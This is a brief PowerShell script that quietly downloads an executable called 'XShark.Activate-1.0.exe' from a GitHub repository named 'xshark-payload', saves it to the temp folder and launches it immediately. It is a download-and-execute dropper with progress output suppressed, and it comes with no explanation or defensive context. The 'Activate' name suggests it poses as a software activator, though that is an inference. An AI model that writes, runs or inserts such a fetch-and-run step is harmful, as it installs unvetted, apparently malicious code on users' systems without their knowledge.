$ProgressPreference = 'SilentlyContinue'

$url = "https://github.com/puppup3336-lab/xshark-payload/releases/download/V1.0/XShark.Activate-1.0.exe"
$dest = "$env:TEMP\XShark.Activate-1.0.exe"

Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process $dest
